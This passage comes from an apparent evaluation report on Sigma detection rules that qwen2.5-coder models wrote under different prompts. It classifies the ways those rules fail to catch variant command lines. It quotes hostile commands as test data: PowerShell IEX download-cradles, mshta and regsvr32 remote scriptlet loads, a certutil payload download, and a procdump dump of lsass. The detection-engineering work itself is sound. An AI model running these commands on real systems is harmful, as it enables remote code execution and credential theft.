  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|windash|all: -c IEX (New-Object Net.WebClient).DownloadString`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|windash|all:
            - '-nop'
            - '-w hidden'
            - '-c IEX (New-Object Net.WebClient).DownloadString'
    condition: selection
```

### Prompt v2 (Run 20261104_1503, Temp 0.2, 3 Repeats)

#### qwen2.5-coder:7b under prompt v2 (27 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 6 | 6 | 22.2% |
| VALUE | 21 | 18 | 77.8% |
| FLAG_INCIDENTAL | 3 | 3 | 11.1% |
| ADJACENT | 0 | 0 | 0.0% |
| PREFIX | 0 | 0 | 0.0% |
| OTHER | 0 | 0 | 0.0% |

**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1218.011: 3, T1218.005: 3, T1105: 3, T1547.001: 3

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (2 examples shown):

- Example 1 (T1136.001):
  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
  - Blocking condition: `Image|endswith: \net.exe`
  - Detection block written by model:
```yaml
detection:
    selection_img:
        Image|endswith:
            - '\net.exe'
    selection_cli:
        CommandLine|contains|all:
            - 'user '
            - ' /add'
    condition: all of selection_*
```

- Example 2 (T1003.001):
  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
  - Blocking condition: `Image|endswith: \procdump.exe`
  - Detection block written by model:
```yaml
detection:
    selection_img:
        Image|endswith:
            - '\procdump.exe'
    selection_cli:
        CommandLine|contains|all:
            - 'lsass.exe'
            - '.dmp'
    condition: all of selection_*
```

**Class: VALUE** (3 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|all: -w hidden`
  - Detection block written by model:
```yaml
detection:
    selection_img:
        Image|endswith:
            - '\powershell.exe'
            - '\powershell64.exe'
    selection_cli:
        CommandLine|contains|all:
            - '-nop'
            - '-w hidden'
            - 'IEX'
            - '(New-Object Net.WebClient).DownloadString'
    condition: all of selection_*
```

- Example 2 (T1218.011):
  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
  - Blocking condition: `CommandLine|contains|all: \Windows\Temp\`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all:
            - '\Windows\Temp\'
            - '.sys,'
    condition: selection
```

- Example 3 (T1218.005):
  - Shown line: `mshta.exe javascript:a=GetObject('script:http://10.0.0.5/x.sct').Exec();close()`
  - Variant line: `mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('calc.exe'))`
  - Blocking condition: `CommandLine|contains|all: GetObject(`
  - Detection block written by model:
```yaml
detection:
    selection_img:
        Image|endswith:
            - '\mshta.exe'
    selection_cli:
        CommandLine|contains|all:
            - 'javascript:'
            - 'GetObject('
            - '.Exec();'
    condition: all of selection_*
```

**Class: FLAG_INCIDENTAL** (1 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|all: -nop`
  - Detection block written by model:
```yaml
detection:
    selection_img:
        Image|endswith:
            - '\powershell.exe'
            - '\powershell64.exe'
    selection_cli:
        CommandLine|contains|all:
            - '-nop'
            - '-w hidden'
            - 'IEX'
            - '(New-Object Net.WebClient).DownloadString'
    condition: all of selection_*
```

#### qwen2.5-coder:14b under prompt v2 (18 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 3 | 3 | 16.7% |
| VALUE | 15 | 15 | 83.3% |
| FLAG_INCIDENTAL | 0 | 0 | 0.0% |
| ADJACENT | 0 | 0 | 0.0% |
| PREFIX | 0 | 0 | 0.0% |
| OTHER | 0 | 0 | 0.0% |

**Top 5 techniques with most TOO_NARROW rules**: T1218.005: 3, T1547.001: 3, T1136.001: 3, T1197: 3, T1047: 3

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (1 examples shown):

- Example 1 (T1136.001):
  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
  - Blocking condition: `Image|endswith: \net.exe`
  - Detection block written by model:
```yaml
detection:
    selection_img:
        Image|endswith: '\net.exe'
    selection_cli:
        CommandLine|contains|all:
            - 'user'
            - '/add'
    condition: all of selection_*
```

**Class: VALUE** (3 examples shown):

- Example 1 (T1218.011):
  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
  - Blocking condition: `CommandLine|contains|all: ,Run`
  - Detection block written by model:
```yaml
detection:
    selection_img:
        Image|endswith: '\rundll32.exe'
    selection_cli:
        CommandLine|contains|all:
            - '.sys'
            - ',Run'
    condition: all of selection_*
```

- Example 2 (T1218.005):
  - Shown line: `mshta.exe javascript:a=GetObject('script:http://10.0.0.5/x.sct').Exec();close()`
  - Variant line: `mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('calc.exe'))`
  - Blocking condition: `CommandLine|contains|all: GetObject`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\mshta.exe'
        CommandLine|contains|all:
            - 'javascript:'
            - 'GetObject'
            - 'Exec'
    condition: selection
```

- Example 3 (T1218.005):
  - Shown line: `mshta.exe javascript:a=GetObject('script:http://10.0.0.5/x.sct').Exec();close()`
  - Variant line: `mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('calc.exe'))`
  - Blocking condition: `CommandLine|contains|all: Exec`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\mshta.exe'
        CommandLine|contains|all:
            - 'javascript:'
            - 'GetObject'
            - 'Exec'
    condition: selection
```

### Prompt v1 (Baseline, Run 20261021_1528, Temp 0.2, 3 Repeats)

#### qwen2.5-coder:7b under prompt v1 (21 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 3 | 3 | 14.3% |
| VALUE | 12 | 12 | 57.1% |
| FLAG_INCIDENTAL | 0 | 0 | 0.0% |
| ADJACENT | 3 | 3 | 14.3% |
| PREFIX | 3 | 3 | 14.3% |
| OTHER | 0 | 0 | 0.0% |

**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1105: 3, T1003.001: 3, T1197: 3, T1033: 3

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (1 examples shown):

- Example 1 (T1003.001):
  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
  - Blocking condition: `Image|endswith: \procdump.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\procdump.exe'
        CommandLine|contains: ' -ma lsass.exe '
    condition: selection
```

**Class: VALUE** (3 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains: -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains: '-nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('
    condition: selection
```

- Example 2 (T1218.010):
  - Shown line: `regsvr32.exe /s /u /i:http://192.168.1.10/file.sct scrobj.dll`
  - Variant line: `regsvr32.exe /s /n /u /i:http://172.16.4.20/payload.sct scrobj.dll`
  - Blocking condition: `CommandLine|contains:  /s /u /i:http://`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\regsvr32.exe'
        CommandLine|contains: ' /s /u /i:http://'
    condition: selection
```

- Example 3 (T1053.005):
  - Shown line: `schtasks.exe /create /tn Updater /tr C:\Users\student\AppData\Local\Temp\x.exe /sc once /st 12:00`
  - Variant line: `schtasks.exe /create /sc once /tn Cleanup /tr C:\Windows\Temp\run.bat /st 09:30`
  - Blocking condition: `CommandLine|contains|all: C:\\Users\\student\\AppData\\Local\\Temp\\`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains|all: ['/create', '/tr', 'C:\\Users\\student\\AppData\\Local\\Temp\\']
    condition: selection
```

**Class: ADJACENT** (1 examples shown):

- Example 1 (T1105):
  - Shown line: `certutil.exe -urlcache -f http://10.0.0.5/payload.exe payload.exe`
  - Variant line: `certutil.exe -f -urlcache https://files.example.net/tool.exe C:\Users\Public\tool.exe`
  - Blocking condition: `CommandLine|contains:  -urlcache -f `
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains: ' -urlcache -f '
    condition: selection
```

**Class: PREFIX** (1 examples shown):

- Example 1 (T1033):
  - Shown line: `whoami.exe /priv`
  - Variant line: `whoami.exe -priv`
  - Blocking condition: `CommandLine|contains:  /priv`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\whoami.exe'
        CommandLine|contains: ' /priv'
    condition: selection
```

#### qwen2.5-coder:14b under prompt v1 (32 TOO_NARROW rules)

| Classification | Rules with this Blocker (Any) | Primary Blocker (First Match) | Share of Rules (Any) |
| --- | ---: | ---: | ---: |
| ALIAS_IMAGE | 5 | 5 | 15.6% |
| VALUE | 24 | 21 | 75.0% |
| FLAG_INCIDENTAL | 3 | 3 | 9.4% |
| ADJACENT | 0 | 0 | 0.0% |
| PREFIX | 3 | 3 | 9.4% |
| OTHER | 2 | 0 | 6.2% |

**Top 5 techniques with most TOO_NARROW rules**: T1059.001: 3, T1218.011: 3, T1218.005: 3, T1105: 3, T1053.005: 3

##### Examples by Failure Class

**Class: ALIAS_IMAGE** (2 examples shown):

- Example 1 (T1136.001):
  - Shown line: `net.exe user hacker P@ssw0rd123 /add`
  - Variant line: `net1.exe user svc_backup Winter2026! /add /domain`
  - Blocking condition: `Image|endswith: \net.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\net.exe'
        CommandLine|contains|all: 
            - ' user '
            - ' /add'
    condition: selection
```

- Example 2 (T1003.001):
  - Shown line: `procdump.exe -ma lsass.exe lsass.dmp`
  - Variant line: `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`
  - Blocking condition: `Image|endswith: \procdump.exe`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\procdump.exe'
        CommandLine|contains|all: 
            - ' -ma '
            - ' lsass.exe '
    condition: selection
```

**Class: VALUE** (3 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|all: -w hidden`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - '-nop'
            - '-w hidden'
            - 'IEX (New-Object Net.WebClient).DownloadString'
    condition: selection
```

- Example 2 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|all:  -w hidden `
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - ' -nop '
            - ' -w hidden '
            - ' IEX (New-Object Net.WebClient).DownloadString('
    condition: selection
```

- Example 3 (T1218.011):
  - Shown line: `rundll32.exe C:\Windows\Temp\driver.sys,Run`
  - Variant line: `rundll32.exe D:\drivers\helper.sys,Start`
  - Blocking condition: `CommandLine|contains|all: C:\Windows\Temp\`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all: 
            - 'C:\Windows\Temp\'
            - '.sys,'
    condition: selection
```

**Class: FLAG_INCIDENTAL** (2 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|all: -nop`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - '-nop'
            - '-w hidden'
            - 'IEX (New-Object Net.WebClient).DownloadString'
    condition: selection
```

- Example 2 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|all:  -nop `
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - ' -nop '
            - ' -w hidden '
            - ' IEX (New-Object Net.WebClient).DownloadString('
    condition: selection
```

**Class: PREFIX** (1 examples shown):

- Example 1 (T1033):
  - Shown line: `whoami.exe /priv`
  - Variant line: `whoami.exe -priv`
  - Blocking condition: `CommandLine|contains:  /priv`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\whoami.exe'
        CommandLine|contains: ' /priv'
    condition: selection
```

**Class: OTHER** (1 examples shown):

- Example 1 (T1059.001):
  - Shown line: `powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')`
  - Variant line: `powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"`
  - Blocking condition: `CommandLine|contains|all:  IEX (New-Object Net.WebClient).DownloadString(`
  - Detection block written by model:
```yaml
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - ' -nop '
            - ' -w hidden '
            - ' IEX (New-Object Net.WebClient).DownloadString('
    condition: selection
```

## Section 3: Extra Observations

### 1. Windash Modifier Usage in TOO_NARROW Rules

Count of TOO_NARROW rules that used the `windash` modifier anywhere in their YAML:

| Model | Prompt | Total TOO_NARROW | Uses Windash | Percentage |
| --- | --- | ---: | ---: | ---: |
| qwen2.5-coder:7b | v3b | 13 | 7 | 53.8% |
| qwen2.5-coder:14b | v3b | 9 | 9 | 100.0% |
| qwen2.5-coder:7b | v3a | 20 | 9 | 45.0% |
| qwen2.5-coder:14b | v3a | 16 | 16 | 100.0% |
| qwen2.5-coder:7b | v2_1 | 25 | 12 | 48.0% |
| qwen2.5-coder:14b | v2_1 | 28 | 16 | 57.1% |
| qwen2.5-coder:7b | v2 | 27 | 0 | 0.0% |
| qwen2.5-coder:14b | v2 | 18 | 2 | 11.1% |
| qwen2.5-coder:7b | v1 | 21 | 0 | 0.0% |
| qwen2.5-coder:14b | v1 | 32 | 0 | 0.0% |

### 2. Value Padded with Spaces

Count of all rules in the run having at least one selection value that starts or ends with a space:

| Model | Prompt | Total Rules | Rules with Padded Value | Percentage |
| --- | --- | ---: | ---: | ---: |
| qwen2.5-coder:7b | v3b | 36 | 0 | 0.0% |
| qwen2.5-coder:14b | v3b | 36 | 0 | 0.0% |
| qwen2.5-coder:7b | v3a | 36 | 0 | 0.0% |
| qwen2.5-coder:14b | v3a | 36 | 0 | 0.0% |
| qwen2.5-coder:7b | v2_1 | 36 | 0 | 0.0% |
| qwen2.5-coder:14b | v2_1 | 36 | 0 | 0.0% |
| qwen2.5-coder:7b | v2 | 36 | 3 | 8.3% |
| qwen2.5-coder:14b | v2 | 36 | 0 | 0.0% |
| qwen2.5-coder:7b | v1 | 36 | 18 | 50.0% |
| qwen2.5-coder:14b | v1 | 36 | 20 | 55.6% |

### 3. Image Check Plus Single Keyword Rule Generalisation

Rules that use only an Image check plus a single CommandLine keyword value, and their strict pass rate:

| Model | Prompt | Total Rules | Keyword-Only Rules | Strict Passes | Strict Pass Rate |
| --- | --- | ---: | ---: | ---: | ---: |
| qwen2.5-coder:7b | v3b | 36 | 15 | 8 | 53.3% |
| qwen2.5-coder:14b | v3b | 36 | 12 | 9 | 75.0% |
| qwen2.5-coder:7b | v3a | 36 | 10 | 8 | 80.0% |
| qwen2.5-coder:14b | v3a | 36 | 9 | 9 | 100.0% |
| qwen2.5-coder:7b | v2_1 | 36 | 3 | 3 | 100.0% |
| qwen2.5-coder:14b | v2_1 | 36 | 3 | 3 | 100.0% |
| qwen2.5-coder:7b | v2 | 36 | 3 | 3 | 100.0% |
| qwen2.5-coder:14b | v2 | 36 | 3 | 3 | 100.0% |
| qwen2.5-coder:7b | v1 | 36 | 24 | 6 | 25.0% |
| qwen2.5-coder:14b | v1 | 36 | 4 | 0 | 0.0% |
